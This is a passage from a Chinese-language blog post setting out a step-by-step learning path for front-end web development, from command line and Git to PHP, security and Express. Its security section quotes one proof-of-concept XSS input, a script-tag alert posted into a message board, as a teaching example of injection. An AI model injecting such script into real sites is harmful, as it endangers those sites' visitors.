href="https://github.com/Lidemy/mentor-program-3rd">課綱</a>改編而來，而且是秉持著上面這些原則在設計的。另外，下面比較多其實都是告訴你該學哪些工具，但請記住在學工具的時候，還必須去思考為什麼需要用到這些工具，它們解決了哪些問題。此篇文章只專注於網頁前端的領域，其餘工程師的基本功（例如說拆解問題或是定義問題範圍等等）不包含在裡面。</p><p>推薦資源的部分，原則上我只推薦自己嘗試過並且真的覺得很不錯的資源，所以並不是每個部分都會有。沒有的話可以自己透過 Google 尋找，學會找資料也是很重要的一環。</p><p>底下文章會很長，因為又要寫理由又要寫目標，我先附上學習路線：</p><blockquote><p><em>1. Command Line 的使用<br>2. Git 的使用<br>3. npm、Node.js 與 JavaScript 程式基礎<br>4. 單元測試 Unit Testing 與 Jest<br>5. 網路基礎概念<br>6. HTML 與 CSS<br>7. JavaScript 與 DOM 以及事件機制<br>8. 非同步與 AJAX<br>9. 基礎後端 PHP 與 MySQL<br>10. 資訊安全概念<br>11. 學習後端框架 Express<br>12. 後端部署<br>13. jQuery 與 Bootstrap<br>14. CSS 預處理器<br>15. 非同步歷程：callback、promise 與 async&#x2F;await<br>16. 深入理解 JavaScript 與瀏覽器相關機制<br>17. gulp 與 webpack<br>18. 物件導向<br>19. React&#x2F;Vue&#x2F;Angular 三選一</em></p></blockquote><p>接著底下就是每一點的詳細介紹。</p><h3 id="1-Command-Line-的使用"><a href="#1-Command-Line-的使用" class="headerlink" title="1. Command Line  的使用"></a>1. Command Line  的使用</h3><p>這是拉近你與電腦距離第一步，也是要開始學程式前最重要的基礎。</p><p>先大概講一下 Command line 是什麼，基本上就是你看電影時會看到電腦高手在一個黑底白字的視窗上打一堆指令（command），而第一步就是要學習怎麼使用這些基本指令。</p><p><img src="/img/front-end-learning-path-55201571ecfe/1__N2IEO3O06TtqdD0sEU3eog.png"></p><h4 id="學習理由"><a href="#學習理由" class="headerlink" title="學習理由"></a>學習理由</h4><p>這一步之所以放最前面的原因有兩個，第一個是它讓你從以往的圖形使用者介面（Graphical User Interface，GUI）切換到命令列介面（Command Line Interface，CLI）。講白話一點，你以前要看桌面有什麼檔案，就用滑鼠點開檔案總管或是 Finder 就行了，你是靠著這些圖形介面去操作的。</p><p>但 Command line 之所以不同，是因為它是用文字去操作。就像我上面的截圖那樣，打一個神奇的指令 ls -al，就可以列出資料夾底下的所有檔案。</p><p>寫程式的本質跟使用 Command line 是一樣的：</p><blockquote><p>利用指令與電腦溝通</p></blockquote><p>第二個原因是它在程式開發裡非常重要。如果你是做設計相關的，電腦裡可能會有 PS、AI 或是 Sketch 等等的軟體，想用的時候只要滑鼠點兩下就可以了。但我們寫程式的不一樣，很多工具都沒有提供圖形介面，你只能使用指令（Command line）去操作它。</p><h4 id="學習目標"><a href="#學習目標" class="headerlink" title="學習目標"></a>學習目標</h4><p>只要學會常見指令（例如說 cd、ls、rm、mv 等等）即可。</p><h3 id="2-Git-的使用"><a href="#2-Git-的使用" class="headerlink" title="2. Git  的使用"></a>2. Git  的使用</h3><p>假設你有一個很喜歡改東西的主管，他請你幫忙畫一張圖。於是你畫好以後把圖片存成 v1.ai 並交給主管看，而主管說不行，要再改，就有了 v2.ai。後來主管說：「顏色改一下就差不多了」，你就把圖片改完以後存成 final.ai。</p><p>可誰知道主管看完以後又說要改，而且還要從 v2 開始改（這時你就會慶幸你有存起來），你只好打開 v2 的檔案，改完以後存成 v2–2.ai。</p><p>接下來的故事不用多說了，final.ai、real-final.ai、fucking-final.ai、real-real-final.ai，最後電腦出現了一大堆你也不知道哪個才是最終版的檔案，把自己搞得頭昏腦脹。</p><p><img src="/img/front-end-learning-path-55201571ecfe/1__2xoGB7uUZo10vLrDychBxw.png"></p><p>版本控制是一件難事，尤其是透過這種傳統式的複製貼上，只會讓自己搞混。如果一個人搞混其實還行，頂多再花一點時間來找，但如果是一整個團隊協作一份文件，那問題就大了。</p><p>而軟體工程師就是一個逃不開團隊協作，也逃不開版本控制的一個行業。例如說目前版本是 v2 穩定版，於是小明繼續開發 v3 的新功能。可是某天 v2 卻被發現了一個 bug！負責救火的小華效率很高，不到一天就把 bug 修掉了。</p><p>可是問題來了，已經寫好的新功能不能發布，因為 v3 還沒開發完成，可是修好 bug 以後又要趕快讓使用者更新成新的版本，那怎麼辦呢？這就是需要版本控制的時候了。</p><p>講了這麼多，我只是想說明在寫程式上（尤其是多人協作時）版本控制的重要性，而最有名的一套協助你做版本控制的程式就叫做 Git。</p><h4 id="學習理由-1"><a href="#學習理由-1" class="headerlink" title="學習理由"></a>學習理由</h4><p>會放在第二個要學的東西，是因為先學了 Git 以後你就可以體驗幫自己以後寫的程式碼做版本控制。雖然說只有一個人的話，有些團隊協作才會碰到的困難會體驗不到，但沒關係，還是可以先從基礎的開始學。</p><h4 id="學習目標-1"><a href="#學習目標-1" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>學習 Git 基本概念：什麼是 repository、什麼是 commit、什麼是 staged…</li><li>學會使用 add、commit、status、log 等基本指令</li><li>搞清楚 Git 與 GitHub 的差別並學會 push、pull、clone、fetch</li><li>學會使用 branch 與 checkout</li></ol><p>如果要學 branch 的使用，誠心推薦 <a href="https://learngitbranching.js.org/index.html">Learn Git Branching</a>。</p><h3 id="3-npm、Node-js-與-JavaScript-程式基礎"><a href="#3-npm、Node-js-與-JavaScript-程式基礎" class="headerlink" title="3. npm、Node.js 與 JavaScript 程式基礎"></a>3. npm、Node.js 與 JavaScript 程式基礎</h3><p>JavaScript 只是一個程式語言，目前主要可以跑在兩個環境上面，第一個環境眾所皆知，叫做瀏覽器，可以利用 JavaScript 去操作畫面；第二個環境叫做 Node.js，可以脫離瀏覽器獨立運作。你安裝好 Node.js 以後，輸入 node index.js 這個指令就可以在你電腦上執行 index.js 這個檔案。</p><p>這邊我希望大家先不要碰瀏覽器，而是在 Node.js 這個環境上執行自己的 JavaScript 程式碼。</p><p>因此這個階段就是要在自己的電腦上安裝 Node.js 環境，並且藉由 JavaScript 來學習程式語言的基礎（變數、判斷式、迴圈、函式等等）。推薦的學習資源是<a href="https://zh.javascript.info/">現代 JavaScript 教程</a>。</p><p>那 npm 又是什麼呢？講到 npm 以前我們要先來講什麼是 library，在程式領域裡面不會翻叫圖書館，而是翻作「函式庫」，就是很多函式的集合啦。</p><p>簡單來說呢，有些功能不是很常用嗎？可能我會用到、你會用到、獨眼龍也會用到，那獨樂樂不如眾樂樂，與你分享的快樂勝過獨自擁有，我今天寫好一大堆常用的 function，可以給其他人用，皆大歡喜。這就叫做「我寫了一個 library 給別人用」。</p><p>npm 全名為 Node Package Manager，這邊的 package 就跟上面講的 library 差不多，中文翻作「套件」。是一個管理 Node.js 相關套件的服務，因此你可以發布自己寫好的套件到上面去，也可以透過 npm 安裝別人寫好的套件。</p><h4 id="學習理由-2"><a href="#學習理由-2" class="headerlink" title="學習理由"></a>學習理由</h4><p>有些人看到這邊可能會問說：「怎麼不是先學 HTML 與 CSS？」</p><p>我的理由是這樣的，既然是要走網頁前端，那就一定要學 JavaScript 這個程式語言，只是早學晚學的問題而已。而 HTML 與 CSS 能夠快速帶給學習者成就感，因為能夠立刻看見自己到底學了什麼，是能夠補充學習動力的科目。</p><p>在學新東西的時候，一定是剛開始最有毅力，之後就會慢慢消退，拖延症開始發作。選在這時候學 JavaScript 就是因為這樣。我覺得趁著動力還沒消退的時候先學比較好，後面才學 HTML 與 CSS，順便把動力一起補上。</p><p>而 npm 之所以重要，是因為你以後會很常用到 npm。在這個階段可以自己找一些簡單的套件來試用看看，順便練習看文件。</p><h4 id="學習目標-2"><a href="#學習目標-2" class="headerlink" title="學習目標"></a>學習目標</h4><p>想要測驗自己有沒有學好程式語言基礎的話，可以透過一些<a href="https://github.com/Lidemy/mentor-program-3rd/tree/master/homeworks/week2">簡單的小題目</a>來驗證，也可以寫一些 <a href="https://github.com/Lidemy/mentor-program-3rd/blob/master/codewar.md">Codewar 的題目</a>。只要裡面提到的那些基本的題目能寫得出來就 ok 了。</p><p>npm 的話只需要知道以下概念：</p><ol><li>什麼是 package.json</li><li>npm install 做了什麼事情</li></ol><h3 id="4-單元測試-Unit-Testing-與-Jest"><a href="#4-單元測試-Unit-Testing-與-Jest" class="headerlink" title="4. 單元測試 Unit Testing 與  Jest"></a>4. 單元測試 Unit Testing 與  Jest</h3><p>上個階段有說可以寫一些小題目來測驗自己的程式基礎是否合格。在像是 Codewar 那種網站上面，它會幫你改，會告訴你錯在哪裡，可是在自己的電腦上要怎麼測呢？</p><p>簡單嘛，就是自己想幾個測試案例，然後用 console.log 印出答案是不是對的。</p><p><img src="/img/front-end-learning-path-55201571ecfe/1__hT0xGx8tfHdRbY0ev6cR3g.png"></p><p>沒錯，這樣子是可以的，但其實這不是一個好方法。因為你必須要用肉眼去判斷到底是哪一個 test case 出了錯，若你的 test case 變多，也很難一時之間看出來到底答案是不是對的。</p><p>閃開！讓專業的來！（突然發現這句話也很有年代感了）</p><p><a href="https://jestjs.io/">Jest</a> 是一套專門讓你測試 JavaScript 程式碼的框架，只要用它指定的架構及函式，就可以輕易寫出用來測試的檔案，而且還會有精美的測試報告。</p><p>而這種針對 function 的輸入以及輸出做測試的方式，我們稱之為單元測試（ Unit Testing）。測試寫得好，程式就不怕改壞掉。因為只要跑一下測試，就能看出程式碼寫得是否正確。</p><h4 id="學習理由-3"><a href="#學習理由-3" class="headerlink" title="學習理由"></a>學習理由</h4><p>會把單元測試放在這的理由是因為我覺得放這裡最貼切。上個階段會寫一堆小的 function，學了 Jest 之後剛好可以幫這些 function 加上單元測試，體驗看看測試的威力。</p><h4 id="學習目標-3"><a href="#學習目標-3" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道如何使用 Jest 測試一個 function 的輸出入</li><li>盡力想出各種 test case</li></ol><h3 id="5-網路基礎概念"><a href="#5-網路基礎概念" class="headerlink" title="5. 網路基礎概念"></a>5. 網路基礎概念</h3><p>在正式進入到網頁前端最有名的 HTML 與 CSS 之前，還有最後一件事情要做，那就是稍微知道一下網路的基礎概念。</p><p>在這階段你必須知道的東西包括但不限於：</p><ol><li>什麼是前端？什麼是後端？</li><li>什麼是 Request？什麼是 Response？</li><li>HTTP 是什麼？HTTP 的 method 又有哪些？</li><li>HTTP 的常見狀態碼（200、301、302、400、404、500…）</li><li>什麼是 API？</li></ol><p>理解這些概念以後，可以試著找一些<a href="https://github.com/public-apis/public-apis">現成的 API</a>，然後使用 Node.js 的一些套件例如說 <a href="https://github.com/request/request">request</a> 或是 <a href="https://github.com/axios/axios">axios</a> 來嘗試串接看看。</p><p>沒有到很清楚沒關係，但基本的概念一定要有。因為一堆新手都對這方面幾乎毫無概念，導致發生問題時根本就找錯癥結點，花了很多時間才發現錯誤根本不是出在自己想像的地方。</p><p>這邊會推薦一些比較理論性的課，除了網路的概念以外也可以順便補齊其他基本概念：</p><ol><li><a href="https://www.youtube.com/watch?v=tpIctyqH29Q&list=PL8dPuuaLjXtNlUrzyH5r6jN9ulIgZBpdo">Crash Course</a></li><li><a href="https://www.lidemy.com/p/cs101-coding">[CS101] 初心者的計概與 coding 火球術</a></li></ol><h4 id="學習理由-4"><a href="#學習理由-4" class="headerlink" title="學習理由"></a>學習理由</h4><p>會把這些網路概念放在這麼前面，是因為我在各個技術相關社團裡面看過太多太多搞錯領域的問題了。明明要問的是前端，卻在後端的社團發問，以為跟後端用的框架有關；明明是網路出了錯，卻以為是前端的問題。這些我都認為是沒有建立起整體網路的概念所導致的。</p><h4 id="學習目標-4"><a href="#學習目標-4" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道什麼是 Request 跟 Response</li><li>知道什麼是 DNS</li><li>知道 localhost 跟 127.0.0.1 是什麼</li><li>知道什麼是 API</li><li>會使用 Node.js 寫出串接 API 的程式</li><li>知道 HTTP method 有哪些</li><li>知道基本的 HTTP status code，像是 200、301、400、404、500</li></ol><h3 id="6-HTML-與-CSS"><a href="#6-HTML-與-CSS" class="headerlink" title="6. HTML 與  CSS"></a>6. HTML 與  CSS</h3><p>前面鋪墊了這麼多，終於可以開始學 HTML 與 CSS 了。前者是網頁的骨架，後者是網頁的衣服。HTML 就只是用特定格式以及標籤組合而成的檔案，你必須選擇適合的標籤來表示內容，只要理解一些常見標籤就差不多了，而學習的重點有兩個。</p><p>第一個是要讓自己的 HTML 符合語意（semantic）。例如說你今天有一個列表，比起用一大堆 <code>&lt;div&gt;</code>，用 <code>&lt;ul&gt;</code> 跟 <code>&lt;li&gt;</code> 會更適合的多。該怎麼檢測呢？你不要看畫面，只看 HTML 原始碼的標籤，試看看能不能看出每個區塊代表的意思或是重要程度，如果可以的話，就代表你寫得不錯。</p><p>第二個是可以稍微關注一下 SEO（Search Engine Optimization），這其實跟上一點滿相關的。搜尋引擎會需要去爬很多網頁，並根據網頁的原始碼來解析。SEO 就是要讓它們能夠看懂你的網頁，知道你網頁上的重點是什麼。</p><p>舉例來說，假設現在有兩個網頁，第一個全部都只有 <code>&lt;div&gt;</code> 標籤，第二個有用 <code>&lt;h1&gt;</code> 把大標題寫出來。機器人看得懂哪一個？當然是第二個，因為 h1 就代表著大標題，它就會把裡面的內容視為是這個網頁的主題之一。</p><p>或是這樣說吧，標籤就像是寫文章的排版一樣，用得不好的沒有粗體、沒有標題甚至還沒有句號，一眼望去全部文字都長得一樣，分不出哪些是大標哪些是小標。用得好的標籤就是優質的排版，一目瞭然，有什麼都十分明瞭。</p><p>HTML 只能對網頁做基本的排版，需要進一步美化的話你需要 CSS。利用 CSS 你可以「針對網頁上不同地方」給予不同樣式，例如說 A 區塊背景是紅色，B 區塊背景是綠色等等。</p><p>這就帶出了 CSS 的第一個重點：我要怎麼選到我想選的地方？</p><p>這叫做 CSS 選擇器（Selector），有一些規則要學，可以透過標籤、class、id 或更複雜的方式來選到想要的元素。學完一些基本的之後可以透過 <a href="https://flukeout.github.io/">CSS dinner</a> 這個超可愛又好玩的遊戲來複習並加強對 selector 的理解。</p><p>再來就是跟排版相關的了，要知道什麼是 box model，知道 position 跟 display 所有屬性的差異，這都是排版很重要的東西。</p><p>為什麼它們重要？因為如果不理解以上機制的話，是沒辦法排版的。盒模型代表著瀏覽器怎麼去看每一個元素，而 display 決定了這些元素能不能排在同一行，position 可以讓你隨心所欲的放置元素。</p><p>另外，也必須知道如何使用 Flexbox 排版。可以透過好玩的 <a href="https://flexboxfroggy.com/">Flexbox Froggy</a> 或是 <a href="https://hexschool.github.io/flexbox-pirate/index.html">Flex Pirate</a> 來學習。如果有時間的話也可以看看比較新的屬性 grid，並且玩一下這個小遊戲：<a href="https://cssgridgarden.com/">Grid Garden</a>。</p><p>最後，也要知道該怎麼在不同螢幕尺寸上做不同的排版。</p><p>核心概念就是：「在不同尺寸上套用不同的 CSS」，例如說你原本是兩欄式排版，在使用手機觀看的時候就把這兩欄的寬度都設為 100%，就變成上下兩行的排版而不是並排了，這樣比較符合手機的使用習慣。</p><p>要做到這件事情需要透過 media queries 這個寫法，依照不同的條件（例如說螢幕寬度、高度等等）來載入不同的 CSS。</p><p>前面已經有講 CSS 學習時的重點了，但理論畢竟只是理論，你千萬不要想著看一看教學文就能夠理解那些理論到底想表達什麼。</p><p>我以前看了 position 的解釋千萬遍，卻從來都不理解 position: absolute 到底是根據誰定位，然後要拿來幹什麼。直到有一天我必須實作一個在圖片右上角放叉叉的功能，那時我才真的知道為什麼需要 absolute。</p><p>除了 CSS，其他東西也是這樣，光看是沒有用的。你看了 position 的解釋一百遍，還不如打開瀏覽器自己亂玩那些屬性一遍。</p><p>推薦的資源有：</p><ol><li><a href="https://internetingishard.com/html-and-css/">html &amp; css is hard</a></li><li><a href="https://learn.shayhowe.com/html-css/">Learn to Code HTML &amp; CSS</a></li><li><a href="https://marksheet.io/">MarkSheet</a></li><li><a href="https://www.tenlong.com.tw/products/9789862765012">HTML &amp; CSS : 網站設計建置優化之道</a>（我學生推薦的）</li></ol><h4 id="學習理由-5"><a href="#學習理由-5" class="headerlink" title="學習理由"></a>學習理由</h4><p>要開始學習前端的話，一定要會 HTML 與 CSS，因為這兩者是網頁的基礎。</p><h4 id="學習目標-5"><a href="#學習目標-5" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道如何使用有語意的（semantic）標籤</li><li>知道基本的 CSS Selector</li><li>知道盒模型（box model ）是什麼，以及 padding、margin、border、width&#x2F;height 與它的關係？</li><li>知道 display 的幾種屬性：block、inline 與 inline-block 差別在哪裡</li><li>知道 position 的幾種屬性：static、relative、absolute、fixed 與 sticky 差別在哪裡</li><li>知道如何使用 Flexbox 來排版</li><li>知道如何使用 media queries</li></ol><h3 id="7-JavaScript-與-DOM-以及事件機制"><a href="#7-JavaScript-與-DOM-以及事件機制" class="headerlink" title="7. JavaScript 與 DOM  以及事件機制"></a>7. JavaScript 與 DOM  以及事件機制</h3><p>還記得我前面說過 JavaScript 基本上可以跑在兩個地方嗎？瀏覽器與 Node.js。在學完 HTML 與 CSS 以後，就可以來試著把 JavaScript 寫在瀏覽器上面了。</p><p>寫在 Node.js 與瀏覽器上面最大的差別就是</p><blockquote><p>你可以使用 JavaScript 操作畫面</p></blockquote><p>只要是頁面上看得到的東西，你都可以改。你可以新增元素、刪除元素、更改樣式，也可以針對不同的元素加上不同的事件監聽器（Event listener）。舉例來說，你可以監聽某個按鈕的 click 事件，使用者點下按鈕的時候你就會知道，就可以針對這個事件做出反應，例如說點下按鈕之後跳出一個 alert 之類的。</p><p>這個部分的學習重點有兩個，第一個是 JavaScript 是如何操作畫面的？是透過一個叫做 DOM（Document Object Model）的東西。簡單來說就是瀏覽器把畫面上那些 HTML 元素都轉成物件，並且提供給你一個 API 來操作它們。</p><p>像是 document.querySelector(‘#aaa’)，會回傳 #aaa 這個 DOM 物件，你只要改變它，畫面上的元素也會跟著改變。所以學習的第一個重點就是如何操作 DOM 物件。你要學會怎麼新增、修改以及刪除這些物件。</p><p>第二個重點則會放在事件機制。</p><p>我要怎麼幫元素加上 event listener？又要怎麼拿掉？如果加上兩個會怎樣？</p><p>除此之外，DOM 的事件機制比你想像的更複雜一點，例如說你有兩個重疊的元素，外面是藍色叫做 Blue，裡面是紅色叫做 Red：</p><p><img src="/img/front-end-learning-path-55201571ecfe/1__17r2vNRFd96Ge__Kpldb__vA.png"></p><p>今天當你點擊 Red 這個方框的時候，Red 的 click 事件就被觸發了。但不僅如此，接著 Blue 的 click 事件也被觸發了！想一想其實也滿合理的，因為 Red 是在 Blue 裡面，藍色的方框不是中空的，只是被紅色蓋過去而已。</p><p>這就是這個部分要學習的重點：事件機制的運作方式，細項可參考底下的學習目標。</p><p>這邊學完以後，你就能做出任何「不牽涉到網路」的應用程式了。例如說單機就可以玩的數獨小遊戲或者是五子棋，都可以做得出來，因為這些都只是畫面跟事件的集合而已。</p><p>舉例來說，五子棋怎麼做？</p><ol><li>先用 HTML 與 CSS 畫出棋盤</li><li>偵測棋盤的點擊事件，點下去時畫一個棋子在點擊的地方</li><li>判斷棋盤上的棋子是否連成一線</li><li>是，遊戲結束</li><li>否，換另一個玩家的回合，回到第二步</li></ol><p>不要以為你只學了這些而已，這些就是精髓了。只要你可以監聽事件，可以更改畫面，有什麼功能是做不出來的？把想做的東西拆解到最後，會發現其實都只是這些操作的組合而已，沒有什麼魔法在裡面，你需要的只是一點想像力而已。</p><h4 id="學習理由-6"><a href="#學習理由-6" class="headerlink" title="學習理由"></a>學習理由</h4><p>如果要在瀏覽器上面學 JavaScript，那勢必要談到 DOM，才能操作畫面。</p><p>但前面我說過了，我不希望先講 HTML 與 CSS，我希望先講「程式語言 JavaScript」。這時候以 Node.js 環境來學習是比較好的方法，因為它不會牽涉到 DOM 或是其他前端的東西，它就只是個簡單的程式語言而已。</p><p>我認為這樣子能有兩個好處：</p><ol><li>知道 JavaScript 不只能在瀏覽器上面跑</li><li>知道 JavaScript 只是個程式語言，DOM 是執行環境（瀏覽器）提供的東西，像是 Node.js 裡面就是沒有 DOM 的。</li></ol><p>這樣才不會把執行環境跟 JavaScript 混為一談。</p><h4 id="學習目標-6"><a href="#學習目標-6" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道 DOM 的基本操作，例如說插入、刪除、更改屬性等等</li><li>知道事件是如何傳遞的。知道什麼是捕獲，什麼又是冒泡。</li><li>知道 e.preventDefault 與 e.stopPropagation 的作用以及差別</li><li>知道 e.target 與 e.currentTarget 的差別</li><li>知道什麼是事件代理（Event delegation）以及適合用的場合</li></ol><h3 id="8-非同步與-AJAX"><a href="#8-非同步與-AJAX" class="headerlink" title="8. 非同步與  AJAX"></a>8. 非同步與  AJAX</h3><p>在上一個部分學完事件機制的相關概念以後，就只差最後一塊拼圖了，那就是 JavaScript 與後端的溝通。我們會使用一種叫做 AJAX 的技術，聽起來很困難，但說穿了其實就是用瀏覽器提供的 Web API 向後端發送 Request 並且拿到 Response。</p><p>這個部份對於前端來說超級無敵重要，因為會有很多概念需要理解，我們一個一個來。</p><p>第一個是瀏覽器的同源政策（Same-Origin Policy）。</p><p>當你利用 JavaScript 發送 Request 的時候，出於安全性的考量瀏覽器會有一些限制。不同的 Request 限制也不太一樣，但大原則就是「如果後端沒有允許你做這件事，就拿不到 Response」。所以通常需要後端的協助，來開啟 CORS（Cross-Origin Resource Sharing，跨來源資源共享）。</p><p>你必須搞清楚什麼是同源政策、為什麼要有同源政策，而它又限制了哪些東西。也必須理解該怎麼利用 XMLHttpRequest 或是 Fetch 來串接 API。</p><p>第二個是既然提到了 AJAX，你也必須知道非同步（Asynchronous）是什麼意思。這邊有些人會被字面上的意思誤導，因為同步（Synchronize）看起來很像「同時做一件事」。</p><p>可是在電腦科學的領域裡面，同步指的其實是「一次只能完成一件事，要等前面的事情做完，才會做下一件事」。如果與後端 API 串接是同步的，會發生什麼事？可怕了，如果後端速度很慢，10 秒後才會回傳 Response，那 JavaScript 必須等 10 秒才能執行下一個指令。</p><p>這不可能嘛，不可能讓整個畫面卡住 10 秒，所以 AJAX 的第一個 A 就代表著 Asynchronous，意思就是非同步地去跟 Server 溝通並交換資料。</p><p>那非同步要怎麼拿到資料？這邊就會講到回呼函式（Callback function）的概念。你準備好一個函式，並且跟瀏覽器說：「欸，你過來一下，等你好的時候記得叫我」。</p><p>除了 AJAX 以外，計時器（例如說 setTimeout）也是非同步的，你不可能原地等三秒之後執行嘛，一定在中途還有做其他事情，三秒後才會觸發計時器。可是眾所皆知，JavaScript 的執行是 single thread，一次只能做一件事，那到底是怎麼樣做到非同步的？</p><p>這就會牽涉到 Event Loop 的機制，我強力推薦這個影片，講的超級好：<a href="https://www.youtube.com/watch?v=8aGhZQkoFbQ">What the heck is the event loop anyway? | Philip Roberts | JSConf EU</a>。</p><h4 id="學習理由-7"><a href="#學習理由-7" class="headerlink" title="學習理由"></a>學習理由</h4><p>先來講一下為什麼建議這樣學，因為前面我們已經有了網路概念，也有了事件機制的概念，基礎的 JavaScript 都沒有問題了。而非同步的相關操作就是理解 JavaScript 的最後一塊拼圖，也是網頁前端很重要的一部分。</p><p>所以才會把 AJAX 放在這裡，等前面基礎打好以後再來接觸 AJAX，並且把非同步的相關概念一併理解。</p><h4 id="學習目標-7"><a href="#學習目標-7" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道非同步與同步的差別</li><li>知道什麼是同源政策（Same-origin policy）</li><li>知道如何存取跨網域的資源（CORS）</li><li>知道如何使用 XMLHttpRequest 或 Fetch 串接 API</li><li>理解 Event loop</li></ol><h3 id="9-基礎後端-PHP-與-MySQL"><a href="#9-基礎後端-PHP-與-MySQL" class="headerlink" title="9. 基礎後端 PHP 與  MySQL"></a>9. 基礎後端 PHP 與  MySQL</h3><p>接著我們要來學習基礎的後端開發，會學純 PHP，也就是在不使用任何 PHP 的框架下來學習。</p><p>另一個重點是資料庫，這邊選用最常見的 MySQL，而且 PHP + MySQL 這個組合有一堆現成的工具可以用，例如說 <a href="https://www.apachefriends.org/zh_tw/index.html">XAMPP</a>，直接幫你把整個環境建好。</p><p>MySQL 的部分不要跑去學什麼 ORM（Object Relational Mapping），請乖乖地寫 SQL Query，好好學一下怎麼樣做 CRUD（Create、Read、Update、Delete），並且自己試著開 Table 然後決定欄位的資料格式。</p><h4 id="學習理由-8"><a href="#學習理由-8" class="headerlink" title="學習理由"></a>學習理由</h4><p>看到這邊有些人可能會問：為什麼要學後端？</p><p>來來來，有沒有注意到標題上的四個字？「網頁前端」，這同時代表著「網頁裡的前端」以及「網頁與前端」兩個意思。網頁分為前端跟後端，如果你只理解前端，你是永遠不可能理解整個網頁的。</p><p>就如同我在第五點網路基礎概念裡面提到的一樣，許多人都是缺乏了整體概念，才會導致出錯時定位錯問題，或是根本不知道問題發生在哪裡。學習後端最主要的理由就是補齊自己缺少的概念，當發生問題時你才知道問題到底出在哪裡。</p><p>這邊我不推薦學 Ruby on Rails，也不推薦 Laravel 跟 Express，而是推薦從 PHP 開始學——沒有使用任何框架的 PHP。</p><p>因為它夠簡單。一個 PHP 檔案就是負責一個頁面，你在檔案裡面 echo 什麼，畫面上就輸出什麼，十分簡單明瞭，而且很容易學。</p><p>若是你有學過一點程式或找過相關資料，可能會問說：「不對啊，可是這樣寫到後面 code 不會很髒嗎？全都混在一起，毫無架構可言！」</p><p>對啊，就是這樣，你說的很對——但我是故意的的。</p><p>如果全世界的生理男都長得像金城武，金城武還是帥的嗎？不是。金城武之所以帥，是因為你看過很多比他醜的人，你才知道金城武是帥的，這是比較而來的。</p><p>寫 code 也是同樣道理。你如果沒有寫過看過爛 code，你看到好 code 的時候怎麼知道它好在哪裡？你不會知道，而且你搞不好也認不出來那是好 code。你必須先寫過夠多爛 code，才會知道好 code 到底厲害在哪裡。</p><p>這就是為什麼我推薦從純 PHP 開始學，因為寫到後面你一定會寫得很髒很亂很難修改很難維護，但唯有這樣，接觸框架時才會知道框架到底好在哪裡。</p><h4 id="學習目標-8"><a href="#學習目標-8" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>理解什麼是前端，什麼是後端</li><li>知道什麼是資料庫</li><li>了解基本的 SQL 語法，包括 Select、Insert Into、Delete 與 Update</li><li>能夠使用 PHP 做出簡單的留言板或是部落格</li></ol><h3 id="10-資訊安全概念"><a href="#10-資訊安全概念" class="headerlink" title="10. 資訊安全概念"></a>10. 資訊安全概念</h3><p>學後端還有一個好處，那就是你會更清楚常見資訊安全漏洞到底是怎麼出現的，以及如何防禦。</p><p>如果你聽我的去學純 PHP 的話，你很有可能會寫出有 SQL Injection 或是 XSS（Cross-site Scripting 跨站式腳本攻擊）以及 CSRF（Cross-site request forgery 跨站請求偽造）漏洞的網站。</p><p>平常看再多文章，都不如自己的網站出漏洞來的有感。像我之前的興趣之一就是攻擊學生們自以為防禦的很好的網站，讓他們知道資訊安全的重要性。</p><p>常見的資安漏洞通常都是沒有預料到使用者的輸入會長得那麼千奇百怪。</p><p>例如說你有一個留言板開放人家留言，後端直接把留言內容印出來，你可能會想說沒什麼。直到某天有人留了 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，讓所有開啟留言板的人都彈出一個視窗，你才意識到：「靠腰勒，原來有人會輸入這麼奇怪的東西」。</p><h4 id="學習理由-9"><a href="#學習理由-9" class="headerlink" title="學習理由"></a>學習理由</h4><p>再重新講一下為什麼我建議不要從框架開始學的理由。若是你學了框架，你很有可能碰不到 SQL Injection 與 XSS，因為框架都幫你防掉了，你想入侵自己的網站都沒有辦法，就少了很多實測的樂趣。而且重點是哪天你一但脫離框架或者是錯誤地使用框架，很有可能產生出漏洞卻不自知，因為你沒有資訊安全的意識。</p><p>所以在這個部分，就是盡量讓自己寫出有漏洞的網站，然後自己試著入侵網站，看看是否能成功。成功以後就開始查詢修補方法，看看要怎麼補起來，這時候就會知道攻擊原理跟防禦手法，印象也會更深刻。</p><p>還有一個很重要的，密碼要記得 hash 過後才存到資料庫，拜託不要存明碼。</p><h4 id="學習目標-9"><a href="#學習目標-9" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道雜湊與加密的差別</li><li>知道什麼是 SQL Injection 以及如何防範</li><li>知道什麼是 XSS 以及如何防範</li><li>知道什麼是 CSRF 以及如何防範</li></ol><h3 id="11-學習後端框架-Express"><a href="#11-學習後端框架-Express" class="headerlink" title="11. 學習後端框架  Express"></a>11. 學習後端框架  Express</h3><p>前面已經受過純 PHP 的折磨了，寫過夠多爛 code，也寫出夠多漏洞了，接下來我才會推薦你開始學框架。要學哪一個都行，但我推薦 <a href="https://expressjs.com/zh-tw/">Express</a>，因為它比較輕量，而且使用的程式語言是 JavaScript。</p><p>這個部分的目標很簡單，就是體驗看看有框架與之前沒框架的差別，熟悉後端框架中的幾個元素（MVC 之類的）與整體架構。</p><p>對於網頁前端工程師，學 Express 還有一個好處，那就是以後想要做什麼 side project 都可以自己來，後端可以自己寫。這是很多前端工程師的煩惱，想要做 side project 可是卻不會後端，資料不知道從哪裡去抓，因此只能放棄。</p><p>如果有時間也可以去學一套 ORM，例如說 <a href="https://sequelize.org/">Sequelize</a>，你會覺得跟之前 SQL query 比起來快很多也簡單很多。</p><p>但是請千萬要記住，像 Express 這種框架或者是 Sequelize 這些 ORM，背後都沒有什麼魔法。拆到最底層一樣是你之前在 PHP 裡面學到的那些基礎，解析 Request、拿取參數、返回 Response 與執行 SQL query 等等。</p><p>學到框架以後就可以拋棄純 PHP 了，以後都可以用框架來開發。因為你是個知道框架在幹嘛，也知道為什麼要用框架的開發者，而不是只會用框架，卻連 SQL query 都不會寫的人。</p><h4 id="學習理由-10"><a href="#學習理由-10" class="headerlink" title="學習理由"></a>學習理由</h4><p>體驗有無框架的差別以及熟悉後端 MVC 架構，會更清楚有架構與沒有架構的差別。</p><h4 id="學習目標-10"><a href="#學習目標-10" class="headerlink" 